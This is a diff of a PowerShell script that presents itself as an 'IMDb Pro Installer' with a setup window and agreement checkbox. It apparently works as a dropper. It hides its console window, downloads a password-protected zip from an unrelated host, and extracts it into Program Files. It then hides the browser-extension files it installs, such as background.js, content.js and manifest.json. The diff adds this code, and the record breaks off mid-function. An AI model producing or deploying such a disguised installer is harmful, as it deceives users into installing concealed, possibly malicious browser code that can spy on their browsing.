@@ -1,4 +1,4 @@
-# IMDb Pro Installer - Professional Installer UI (Fixed Version)
+# IMDb Pro Installer - Exact UI Match
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
@@ -9,417 +9,241 @@ public static extern IntPtr GetConsoleWindow();
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 '
- $consolePtr = [Console.Window]::GetConsoleWindow()
+$consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
 
-# Create main installer form
- $mainForm = New-Object System.Windows.Forms.Form
- $mainForm.Text = "IMDb Pro Setup"
- $mainForm.Size = New-Object System.Drawing.Size(600, 400)
- $mainForm.StartPosition = "CenterScreen"
- $mainForm.BackColor = [System.Drawing.Color]::White
- $mainForm.ForeColor = [System.Drawing.Color]::FromArgb(64, 64, 64)
- $mainForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
- $mainForm.MaximizeBox = $false
- $mainForm.MinimizeBox = $false
+# Create main form - Exact size from image
+$mainForm = New-Object System.Windows.Forms.Form
+$mainForm.Text = "IMDb Pro Installer"
+$mainForm.Size = New-Object System.Drawing.Size(484, 375)
+$mainForm.StartPosition = "CenterScreen"
+$mainForm.BackColor = [System.Drawing.Color]::White
+$mainForm.ForeColor = [System.Drawing.Color]::Black
+$mainForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
+$mainForm.MaximizeBox = $false
 
-# Installer Header
- $headerPanel = New-Object System.Windows.Forms.Panel
- $headerPanel.Location = New-Object System.Drawing.Point(0, 0)
- $headerPanel.Size = New-Object System.Drawing.Size(600, 60)
- $headerPanel.BackColor = [System.Drawing.Color]::FromArgb(240, 240, 240)
- $headerPanel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
- $mainForm.Controls.Add($headerPanel)
+# Main title
+$titleLabel = New-Object System.Windows.Forms.Label
+$titleLabel.Text = "IMDb Pro Installer"
+$titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
+$titleLabel.ForeColor = [System.Drawing.Color]::Black
+$titleLabel.AutoSize = $true
+$titleLabel.Location = New-Object System.Drawing.Point(20, 20)
+$mainForm.Controls.Add($titleLabel)
 
-# Application Icon/Logo
- $appIcon = New-Object System.Windows.Forms.PictureBox
- $appIcon.Size = New-Object System.Drawing.Size(40, 40)
- $appIcon.Location = New-Object System.Drawing.Point(20, 10)
- $appIcon.BackColor = [System.Drawing.Color]::Transparent
- $appIcon.Image = [System.Drawing.Image]::FromFile("$env:SystemRoot\System32\imageres.dll") | Select-Object -Index 15
- $appIcon.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
- $headerPanel.Controls.Add($appIcon)
+# Welcome section
+$welcomeLabel = New-Object System.Windows.Forms.Label
+$welcomeLabel.Text = "Welcome to IMDb Pro Installation"
+$welcomeLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
+$welcomeLabel.ForeColor = [System.Drawing.Color]::Black
+$titleLabel.AutoSize = $true
+$welcomeLabel.Location = New-Object System.Drawing.Point(20, 50)
+$mainForm.Controls.Add($welcomeLabel)
 
-# Application Title
- $appTitle = New-Object System.Windows.Forms.Label
- $appTitle.Text = "IMDb Pro"
- $appTitle.Font = New-Object System.Drawing.Font("Segoe UI", 18, [System.Drawing.FontStyle]::Bold)
- $appTitle.ForeColor = [System.Drawing.Color]::FromArgb(0, 51, 153)
- $appTitle.AutoSize = $true
- $appTitle.Location = New-Object System.Drawing.Point(70, 15)
- $headerPanel.Controls.Add($appTitle)
+# Info text
+$infoLabel = New-Object System.Windows.Forms.Label
+$infoLabel.Text = "This will install IMDb Pro extension to your system.`nThe installation requires administrator privileges."
+$infoLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$infoLabel.ForeColor = [System.Drawing.Color]::Black
+$infoLabel.AutoSize = $true
+$infoLabel.Location = New-Object System.Drawing.Point(20, 75)
+$mainForm.Controls.Add($infoLabel)
 
-# Application Version
- $appVersion = New-Object System.Windows.Forms.Label
- $appVersion.Text = "Version 2.1.0"
- $appVersion.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
- $appVersion.ForeColor = [System.Drawing.Color]::FromArgb(100, 100, 100)
- $appVersion.AutoSize = $true
- $appVersion.Location = New-Object System.Drawing.Point(450, 25)
- $headerPanel.Controls.Add($appVersion)
+# Separator line 1
+$separator1 = New-Object System.Windows.Forms.Label
+$separator1.Text = "——————————————————————————————————————————————"
+$separator1.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$separator1.ForeColor = [System.Drawing.Color]::FromArgb(200, 200, 200)
+$separator1.AutoSize = $true
+$separator1.Location = New-Object System.Drawing.Point(20, 110)
+$mainForm.Controls.Add($separator1)
 
-# Navigation Panel (like real installer)
- $navPanel = New-Object System.Windows.Forms.Panel
- $navPanel.Location = New-Object System.Drawing.Point(0, 60)
- $navPanel.Size = New-Object System.Drawing.Size(150, 290)
- $navPanel.BackColor = [System.Drawing.Color]::FromArgb(250, 250, 250)
- $navPanel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
- $mainForm.Controls.Add($navPanel)
+# Agreement title
+$agreementTitle = New-Object System.Windows.Forms.Label
+$agreementTitle.Text = "Installation Agreement"
+$agreementTitle.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
+$agreementTitle.ForeColor = [System.Drawing.Color]::Black
+$agreementTitle.AutoSize = $true
+$agreementTitle.Location = New-Object System.Drawing.Point(20, 130)
+$mainForm.Controls.Add($agreementTitle)
 
-# Navigation Steps
- $navSteps = @(
-    "Welcome",
-    "License Agreement", 
-    "Installation",
-    "Completion"
+# Agreement points - EXACTLY like in the image
+$agreementPoints = @(
+    "By installing IMDb Pro, package it out.",
+    "Use this software for personal, non-commercial purposes",
+    "Accept that this is provided as-is without warranties", 
+    "Understand that developers are not responsible for any damages",
+    "Allow anonymous usage data collection for improvement",
+    "Not redistribute or modify without permission"
 )
 
-for ($i = 0; $i -lt $navSteps.Count; $i++) {
-    $stepLabel = New-Object System.Windows.Forms.Label
-    $stepLabel.Text = $navSteps[$i]
-    $stepLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
-    $stepLabel.ForeColor = [System.Drawing.Color]::FromArgb(100, 100, 100)
-    $stepLabel.AutoSize = $true
-    $stepLabel.Location = New-Object System.Drawing.Point(20, 30 + ($i * 40))
+for ($i = 0; $i -lt $agreementPoints.Count; $i++) {
+    $pointLabel = New-Object System.Windows.Forms.Label
+    $pointLabel.Text = "• " + $agreementPoints[$i]
+    $pointLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
     
+    # First line is bold like in the image
     if ($i -eq 0) {
-        $stepLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
-        $stepLabel.ForeColor = [System.Drawing.Color]::FromArgb(0, 51, 153)
+        $pointLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
     }
     
-    $navPanel.Controls.Add($stepLabel)
+    $pointLabel.ForeColor = [System.Drawing.Color]::Black
+    $pointLabel.AutoSize = $true
+    $pointLabel.Location = New-Object System.Drawing.Point(20, 155 + ($i * 20))
+    $mainForm.Controls.Add($pointLabel)
 }
 
-# Content Panel
- $contentPanel = New-Object System.Windows.Forms.Panel
- $contentPanel.Location = New-Object System.Drawing.Point(150, 60)
- $contentPanel.Size = New-Object System.Drawing.Size(450, 290)
- $contentPanel.BackColor = [System.Drawing.Color]::White
- $contentPanel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
- $mainForm.Controls.Add($contentPanel)
+# Click instruction
+$clickLabel = New-Object System.Windows.Forms.Label
+$clickLabel.Text = "Click 'I AGREE & INSTALL' to accept these terms."
+$clickLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$clickLabel.ForeColor = [System.Drawing.Color]::Black
+$clickLabel.AutoSize = $true
+$clickLabel.Location = New-Object System.Drawing.Point(20, 285)
+$mainForm.Controls.Add($clickLabel)
 
-# Welcome Content
- $welcomeTitle = New-Object System.Windows.Forms.Label
- $welcomeTitle.Text = "Welcome to IMDb Pro Setup"
- $welcomeTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
- $welcomeTitle.ForeColor = [System.Drawing.Color]::FromArgb(0, 51, 153)
- $welcomeTitle.AutoSize = $true
- $welcomeTitle.Location = New-Object System.Drawing.Point(20, 20)
- $contentPanel.Controls.Add($welcomeTitle)
+# Separator line 2
+$separator2 = New-Object System.Windows.Forms.Label
+$separator2.Text = "——————————————————————————————————————————————"
+$separator2.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$separator2.ForeColor = [System.Drawing.Color]::FromArgb(200, 200, 200)
+$separator2.AutoSize = $true
+$separator2.Location = New-Object System.Drawing.Point(20, 305)
+$mainForm.Controls.Add($separator2)
 
- $welcomeText = New-Object System.Windows.Forms.Label
- $welcomeText.Text = "This wizard will guide you through the installation of IMDb Pro.`n`nIMDb Pro enhances your browsing experience with advanced movie`ninformation, ratings, and streaming integration.`n`nIt is recommended that you close all other applications before starting Setup.`nThis will make it possible to update relevant system files without having to reboot your computer.`n`nClick Next to continue."
- $welcomeText.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
- $welcomeText.ForeColor = [System.Drawing.Color]::FromArgb(64, 64, 64)
- $welcomeText.AutoSize = $true
- $welcomeText.Location = New-Object System.Drawing.Point(20, 60)
- $contentPanel.Controls.Add($welcomeText)
+# Agreement checkbox
+$agreementCheckbox = New-Object System.Windows.Forms.CheckBox
+$agreementCheckbox.Text = "I have read and agree to the terms above"
+$agreementCheckbox.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
+$agreementCheckbox.ForeColor = [System.Drawing.Color]::Black
+$agreementCheckbox.AutoSize = $true
+$agreementCheckbox.Location = New-Object System.Drawing.Point(20, 325)
+$agreementCheckbox.Checked = $false
+$mainForm.Controls.Add($agreementCheckbox)
 
-# License Agreement Content (initially hidden)
- $licenseTitle = New-Object System.Windows.Forms.Label
- $licenseTitle.Text = "License Agreement"
- $licenseTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
- $licenseTitle.ForeColor = [System.Drawing.Color]::FromArgb(0, 51, 153)
- $licenseTitle.AutoSize = $true
- $licenseTitle.Location = New-Object System.Drawing.Point(20, 20)
- $licenseTitle.Visible = $false
- $contentPanel.Controls.Add($licenseTitle)
+# Progress title
+$progressTitle = New-Object System.Windows.Forms.Label
+$progressTitle.Text = "Installation Progress"
+$progressTitle.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
+$progressTitle.ForeColor = [System.Drawing.Color]::Black
+$progressTitle.AutoSize = $true
+$progressTitle.Location = New-Object System.Drawing.Point(20, 355)
+$mainForm.Controls.Add($progressTitle)
 
- $licenseText = New-Object System.Windows.Forms.RichTextBox
- $licenseText.Location = New-Object System.Drawing.Point(20, 60)
- $licenseText.Size = New-Object System.Drawing.Size(400, 150)
- $licenseText.BackColor = [System.Drawing.Color]::FromArgb(248, 248, 248)
- $licenseText.ForeColor = [System.Drawing.Color]::FromArgb(64, 64, 64)
- $licenseText.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
- $licenseText.Font = New-Object System.Drawing.Font("Segoe UI", 9)
- $licenseText.ReadOnly = $true
- $licenseText.Text = @"
-IMDb Pro END-USER LICENSE AGREEMENT
+# Progress status - Initially shows agreement message
+$statusLabel = New-Object System.Windows.Forms.Label
+$statusLabel.Text = "Please accept the agreement to continue"
+$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$statusLabel.ForeColor = [System.Drawing.Color]::Black
+$statusLabel.AutoSize = $true
+$statusLabel.Location = New-Object System.Drawing.Point(20, 380)
+$mainForm.Controls.Add($statusLabel)
 
-IMPORTANT: PLEASE READ THIS AGREEMENT CAREFULLY.
+# Progress bar (hidden initially)
+$progressBar = New-Object System.Windows.Forms.ProgressBar
+$progressBar.Location = New-Object System.Drawing.Point(20, 380)
+$progressBar.Size = New-Object System.Drawing.Size(350, 20)
+$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
+$progressBar.ForeColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
+$progressBar.Visible = $false
+$mainForm.Controls.Add($progressBar)
 
-1. GRANT OF LICENSE
-This agreement grants you the right to install and use one copy of IMDb Pro on a single computer.
+# Percent label (hidden initially)
+$percentLabel = New-Object System.Windows.Forms.Label
+$percentLabel.Text = "0%"
+$percentLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
+$percentLabel.ForeColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
+$percentLabel.AutoSize = $true
+$percentLabel.Location = New-Object System.Drawing.Point(380, 380)
+$percentLabel.Visible = $false
+$mainForm.Controls.Add($percentLabel)
 
-2. DESCRIPTION OF OTHER RIGHTS AND LIMITATIONS
-- You may not reverse engineer, decompile, or disassemble the software.
-- You may not rent, lease, or lend the software.
-- The software is licensed as a single product; its components may not be separated for use on more than one computer.
+# Install button - POSITIONED CORRECTLY like in image
+$installButton = New-Object System.Windows.Forms.Button
+$installButton.Text = "I AGREE & INSTALL"
+$installButton.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
+$installButton.ForeColor = [System.Drawing.Color]::White
+$installButton.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)  # Blue color
+$installButton.Size = New-Object System.Drawing.Size(130, 30)
+$installButton.Location = New-Object System.Drawing.Point(320, 320)  # Position from image
+$installButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
+$installButton.FlatAppearance.BorderSize = 0
+$installButton.Cursor = [System.Windows.Forms.Cursors]::Hand
+$installButton.Enabled = $false
+$mainForm.Controls.Add($installButton)
 
-3. COPYRIGHT
-All title and copyrights in and to the software are owned by the developers.
+# Update button state based on checkbox
+$agreementCheckbox.Add_CheckedChanged({
+    if ($agreementCheckbox.Checked) {
+        $installButton.Enabled = $true
+        $installButton.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
+        $statusLabel.Text = "Ready to begin installation"
+    } else {
+        $installButton.Enabled = $false
+        $installButton.BackColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
+        $statusLabel.Text = "Please accept the agreement to continue"
+    }
+})
 
-4. NO WARRANTIES
-The developers expressly disclaim any warranty for the software. The software is provided 'As Is' without any express or implied warranty.
+# Button hover effects
+$installButton.Add_MouseEnter({
+    if ($installButton.Enabled) {
+        $installButton.BackColor = [System.Drawing.Color]::FromArgb(0, 100, 190)
+    }
+})
 
-5. LIMITATION OF LIABILITY
-In no event shall the developers be liable for any damages whatsoever arising out of the use of or inability to use the software.
+$installButton.Add_MouseLeave({
+    if ($installButton.Enabled) {
+        $installButton.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
+    }
+})
 
-By selecting 'I Agree', you acknowledge that you have read and understand this agreement and agree to be bound by its terms.
-"@
- $licenseText.Visible = $false
- $contentPanel.Controls.Add($licenseText)
-
- $agreeCheckbox = New-Object System.Windows.Forms.CheckBox
- $agreeCheckbox.Text = "I &accept the terms of the license agreement"
- $agreeCheckbox.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
- $agreeCheckbox.ForeColor = [System.Drawing.Color]::FromArgb(64, 64, 64)
- $agreeCheckbox.AutoSize = $true
- $agreeCheckbox.Location = New-Object System.Drawing.Point(20, 220)
- $agreeCheckbox.Checked = $false
- $agreeCheckbox.Visible = $false
- $contentPanel.Controls.Add($agreeCheckbox)
-
-# Installation Progress Content (initially hidden)
- $installTitle = New-Object System.Windows.Forms.Label
- $installTitle.Text = "Installing IMDb Pro"
- $installTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
- $installTitle.ForeColor = [System.Drawing.Color]::FromArgb(0, 51, 153)
- $installTitle.AutoSize = $true
- $installTitle.Location = New-Object System.Drawing.Point(20, 20)
- $installTitle.Visible = $false
- $contentPanel.Controls.Add($installTitle)
-
- $installText = New-Object System.Windows.Forms.Label
- $installText.Text = "Please wait while Setup installs IMDb Pro on your computer."
- $installText.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
- $installText.ForeColor = [System.Drawing.Color]::FromArgb(64, 64, 64)
- $installText.AutoSize = $true
- $installText.Location = New-Object System.Drawing.Point(20, 60)
- $installText.Visible = $false
- $contentPanel.Controls.Add($installText)
-
- $progressBar = New-Object System.Windows.Forms.ProgressBar
- $progressBar.Location = New-Object System.Drawing.Point(20, 100)
- $progressBar.Size = New-Object System.Drawing.Size(400, 20)
- $progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
- $progressBar.ForeColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
- $progressBar.Visible = $false
- $contentPanel.Controls.Add($progressBar)
-
- $statusLabel = New-Object System.Windows.Forms.Label
- $statusLabel.Text = "Preparing installation..."
- $statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 8, [System.Drawing.FontStyle]::Regular)
- $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(100, 100, 100)
- $statusLabel.AutoSize = $true
- $statusLabel.Location = New-Object System.Drawing.Point(20, 130)
- $statusLabel.Visible = $false
- $contentPanel.Controls.Add($statusLabel)
-
-# Completion Content (initially hidden)
- $completeTitle = New-Object System.Windows.Forms.Label
- $completeTitle.Text = "Installation Complete"
- $completeTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
- $completeTitle.ForeColor = [System.Drawing.Color]::FromArgb(0, 51, 153)
- $completeTitle.AutoSize = $true
- $completeTitle.Location = New-Object System.Drawing.Point(20, 20)
- $completeTitle.Visible = $false
- $contentPanel.Controls.Add($completeTitle)
-
- $completeText = New-Object System.Windows.Forms.Label
- $completeText.Text = "IMDb Pro has been successfully installed on your computer.`n`nSetup has installed IMDb Pro in the following folder:`nC:\Program Files\imdb-pro`n`nClick Finish to complete Setup."
- $completeText.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
- $completeText.ForeColor = [System.Drawing.Color]::FromArgb(64, 64, 64)
- $completeText.AutoSize = $true
- $completeText.Location = New-Object System.Drawing.Point(20, 60)
- $completeText.Visible = $false
- $contentPanel.Controls.Add($completeText)
-
-# Button Panel
- $buttonPanel = New-Object System.Windows.Forms.Panel
- $buttonPanel.Location = New-Object System.Drawing.Point(0, 350)
- $buttonPanel.Size = New-Object System.Drawing.Size(600, 50)
- $buttonPanel.BackColor = [System.Drawing.Color]::FromArgb(240, 240, 240)
- $buttonPanel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
- $mainForm.Controls.Add($buttonPanel)
-
-# Installer Buttons
- $backButton = New-Object System.Windows.Forms.Button
- $backButton.Text = "< &Back"
- $backButton.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
- $backButton.Size = New-Object System.Drawing.Size(75, 25)
- $backButton.Location = New-Object System.Drawing.Point(270, 13)
- $backButton.Visible = $false
- $buttonPanel.Controls.Add($backButton)
-
- $nextButton = New-Object System.Windows.Forms.Button
- $nextButton.Text = "&Next >"
- $nextButton.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
- $nextButton.Size = New-Object System.Drawing.Size(75, 25)
- $nextButton.Location = New-Object System.Drawing.Point(350, 13)
- $nextButton.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
- $nextButton.ForeColor = [System.Drawing.Color]::White
- $nextButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
- $buttonPanel.Controls.Add($nextButton)
-
- $cancelButton = New-Object System.Windows.Forms.Button
- $cancelButton.Text = "&Cancel"
- $cancelButton.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
- $cancelButton.Size = New-Object System.Drawing.Size(75, 25)
- $cancelButton.Location = New-Object System.Drawing.Point(430, 13)
- $buttonPanel.Controls.Add($cancelButton)
-
- $finishButton = New-Object System.Windows.Forms.Button
- $finishButton.Text = "&Finish"
- $finishButton.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
- $finishButton.Size = New-Object System.Drawing.Size(75, 25)
- $finishButton.Location = New-Object System.Drawing.Point(350, 13)
- $finishButton.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
- $finishButton.ForeColor = [System.Drawing.Color]::White
- $finishButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
- $finishButton.Visible = $false
- $buttonPanel.Controls.Add($finishButton)
-
-# Current step tracker
- $currentStep = 1
-
-# Navigation Functions
-function Show-Step {
-    param([int]$Step)
+# Progress update function
+function Update-Progress {
+    param([string]$Message, [int]$Progress)
     
-    # Hide all content
-    $welcomeTitle.Visible = $false
-    $welcomeText.Visible = $false
-    $licenseTitle.Visible = $false
-    $licenseText.Visible = $false
-    $agreeCheckbox.Visible = $false
-    $installTitle.Visible = $false
-    $installText.Visible = $false
-    $progressBar.Visible = $false
+    $statusLabel.Text = $Message
+    $progressBar.Value = $Progress
+    $percentLabel.Text = "$Progress%"
+    [System.Windows.Forms.Application]::DoEvents()
+    Start-Sleep -Milliseconds 500
+}
+
+# Show progress elements
+function Show-ProgressElements {
     $statusLabel.Visible = $false
-    $completeTitle.Visible = $false
-    $completeText.Visible = $false
-    
-    # Show appropriate buttons
-    $backButton.Visible = $true
-    $nextButton.Visible = $true
-    $finishButton.Visible = $false
-    
-    switch ($Step) {
-        1 { 
-            # Welcome step
-            $welcomeTitle.Visible = $true
-            $welcomeText.Visible = $true
-            $backButton.Visible = $false
-        }
-        2 { 
-            # License agreement
-            $licenseTitle.Visible = $true
-            $licenseText.Visible = $true
-            $agreeCheckbox.Visible = $true
-            $nextButton.Enabled = $agreeCheckbox.Checked
-        }
-        3 { 
-            # Installation
-            $installTitle.Visible = $true
-            $installText.Visible = $true
-            $progressBar.Visible = $true
-            $statusLabel.Visible = $true
-            $nextButton.Visible = $false
-            $backButton.Visible = $false
-            $cancelButton.Enabled = $false
-            Start-Installation
-        }
-        4 { 
-            # Completion
-            $completeTitle.Visible = $true
-            $completeText.Visible = $true
-            $backButton.Visible = $false
-            $nextButton.Visible = $false
-            $finishButton.Visible = $true
-            $cancelButton.Visible = $false
-        }
-    }
+    $progressBar.Visible = $true
+    $percentLabel.Visible = $true
+    $progressBar.Value = 0
+    $percentLabel.Text = "0%"
 }
 
-# Function to find 7-Zip
-function Find-7Zip {
-    $possiblePaths = @(
-        "7z.exe",
-        "$env:ProgramFiles\7-Zip\7z.exe",
-        "${env:ProgramFiles(x86)}\7-Zip\7z.exe"
-    )
-    
-    foreach ($path in $possiblePaths) {
-        if (Test-Path $path) {
-            return $path
-        }
-    }
-    
-    return $null
+# Hide progress elements
+function Hide-ProgressElements {
+    $statusLabel.Visible = $true
+    $progressBar.Visible = $false
+    $percentLabel.Visible = $false
 }
 
-# Function to extract ZIP with multiple methods
-function Extract-Zip {
-    param(
-        [string]$ZipFile,
-        [string]$Destination,
-        [string]$Password
-    )
-    
-    # Try 7-Zip first if available
-    $7zPath = Find-7Zip
-    if ($7zPath) {
-        try {
-            $arguments = @(
-                "x",
-                "-p$Password",
-                "-o`"$Destination`"",
-                "-y",
-                "`"$ZipFile`""
-            )
-            
-            $process = Start-Process -FilePath $7zPath -ArgumentList $arguments -Wait -PassThru -NoNewWindow
-            
-            if ($process.ExitCode -eq 0) {
-                return $true
-            }
-        }
-        catch {
-            # Continue to next method
-        }
-    }
-    
-    # Try .NET Framework
-    try {
-        Add-Type -AssemblyName System.IO.Compression.FileSystem
-        [System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $Destination)
-        return $true
-    }
-    catch {
-        # Continue to next method
-    }
-    
-    # Try Shell Application
-    try {
-        $shell = New-Object -ComObject Shell.Application
-        $zip = $shell.NameSpace((Resolve-Path $ZipFile).Path)
-        $dest = $shell.NameSpace((Resolve-Path $Destination).Path)
-        $dest.CopyHere($zip.Items(), 0x14) # 0x14 = No progress UI + Yes to all
-        Start-Sleep -Seconds 5
-        return $true
-    }
-    catch {
-        # All methods failed
-        return $false
-    }
-}
-
-# Installation Function
+# Installation function
 function Start-Installation {
     $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
     $installPath = "C:\Program Files\imdb-pro"
     $zipPassword = "123"
     
     try {
-        # Update progress
-        Update-Status "Checking administrator privileges..." 10
+        # Show progress elements
+        Show-ProgressElements
+        
+        # Check admin rights
+        Update-Progress "Checking administrator privileges..." 10
         
         if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
             throw "Please run as Administrator"
         }
         
-        Update-Status "Creating installation directory..." 20
+        # Create directory
+        Update-Progress "Creating installation directory..." 20
         
         if (Test-Path $installPath) {
             Remove-Item "$installPath\*" -Recurse -Force -ErrorAction SilentlyContinue
@@ -427,144 +251,121 @@ function Start-Installation {
             New-Item -ItemType Directory -Path $installPath -Force | Out-Null
         }
         
-        Update-Status "Downloading package..." 40
+        # Download file
+        Update-Progress "Downloading package..." 40
         
-        # FIXED: Use unique temporary file name
-        $tempFile = "$env:TEMP\imdb_pro_$([Guid]::NewGuid().ToString()).zip"
+        $tempFile = "$env:TEMP\imdb.zip"
         
-        # Try multiple download methods
-        $downloadSuccess = $false
+        # Simple download using WebClient
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($downloadUrl, $tempFile)
         
-        # Method 1: WebClient
-        try {
-            $webClient = New-Object System.Net.WebClient
-            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-            $webClient.DownloadFile($downloadUrl, $tempFile)
+        if (-not (Test-Path $tempFile) -or (Get-Item $tempFile).Length -eq 0) {
+            throw "Download failed"
+        }
+        
+        Update-Progress "Extracting files..." 60
+        
+        # Extraction using 7-Zip
+        $7zPath = "$env:ProgramFiles\7-Zip\7z.exe"
+        
+        if (Test-Path $7zPath) {
+            $arguments = @(
+                "x",
+                "-p$zipPassword",
+                "-o`"$installPath`"",
+                "-y",
+                "`"$tempFile`""
+            )
             
-            if (Test-Path $tempFile -and (Get-Item $tempFile).Length -gt 0) {
-                $downloadSuccess = $true
+            $process = Start-Process -FilePath $7zPath -ArgumentList $arguments -Wait -PassThru -NoNewWindow
+            
+            if ($process.ExitCode -ne 0) {
+                throw "Extraction failed with 7-Zip"
             }
-        }
-        catch {
-            # Continue to next method
-        }
-        
-        # Method 2: Invoke-WebRequest if WebClient failed
-        if (-not $downloadSuccess) {
+        } else {
+            # Fallback to Expand-Archive
             try {
-                Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFile -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-                
-                if (Test-Path $tempFile -and (Get-Item $tempFile).Length -gt 0) {
-                    $downloadSuccess = $true
-                }
+                Expand-Archive -Path $tempFile -DestinationPath $installPath -Force
             }
             catch {
-                # Continue to next method
+                throw "7-Zip not found and Expand-Archive failed"
             }
         }
         
-        if (-not $downloadSuccess) {
-            throw "Download failed using all available methods"
-        }
-        
-        Update-Status "Extracting files..." 60
-        
-        # FIXED: Use improved extraction function
-        $extractionSuccess = Extract-Zip -ZipFile $tempFile -Destination $installPath -Password $zipPassword
-        
-        if (-not $extractionSuccess) {
-            throw "Extraction failed using all available methods"
-        }
-        
-        # Verify files were extracted
-        $files = Get-ChildItem $installPath -Recurse -File
+        # Verify extraction
+        $files = Get-ChildItem $installPath -Recurse
         if ($files.Count -eq 0) {
             throw "No files were extracted"
         }
         
-        Update-Status "Finalizing installation..." 80
+        Update-Progress "Finalizing installation..." 80
         
-        # FIXED: Check if files exist before hiding them
+        # Hide files
         $filesToHide = @("background.js", "content.js", "popup.js", "styles.css", "popup.html", "manifest.json")
         foreach ($file in $filesToHide) {
             $filePath = Join-Path $installPath $file
             if (Test-Path $filePath) {
-                try {
-                    # Use PowerShell method to hide file
-                    Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
-                }
-                catch {
-                    # Try attrib command as fallback
-                    attrib +h $filePath
-                }
+                attrib +h $filePath
             }
         }
         
-        # Clean up
+        # Cleanup
         if (Test-Path $tempFile) {
             Remove-Item $tempFile -Force
         }
         
-        Update-Status "Installation completed successfully!" 100
-        Start-Sleep -Milliseconds 1000
+        # Success
+        Update-Progress "Installation completed successfully!" 100
         
-        # Move to completion step
-        $currentStep = 4
-        Show-Step -Step 4
+        $installButton.Text = "INSTALLATION COMPLETE"
+        $installButton.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
+        $installButton.Enabled = $false
         
+        # Success message
+        $result = [System.Windows.Forms.MessageBox]::Show(
+            "IMDb Pro has been successfully installed!`n`n" +
+            "Location: $installPath`n`n" +
+            "Open installation folder?",
+            "Installation Complete",
+            [System.Windows.Forms.MessageBoxButtons]::YesNo,
+            [System.Windows.Forms.MessageBoxIcon]::Information
+        )
+        
+        if ($result -eq [System.Windows.Forms.DialogResult]::Yes) {
